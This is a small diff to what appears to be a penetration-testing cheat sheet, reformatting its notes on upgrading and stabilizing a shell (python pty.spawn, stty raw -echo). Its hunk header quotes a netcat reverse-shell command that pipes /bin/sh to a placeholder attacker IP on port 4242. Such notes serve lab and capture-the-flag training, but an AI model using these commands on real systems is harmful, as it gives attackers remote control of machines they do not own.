@@ -22,12 +22,15 @@ $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 Stabilizing/ Upgrading Shells:
 
 + <b>Using Ptyhon</b>
+
+*Upgrading:*
 ```
-Upgrading:
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
 $export TERM=xterm
+```
 
-Stablizing:
+*Stablizing:*
+```
 $^Z
 $stty raw -echo; fg
 (ENTER)
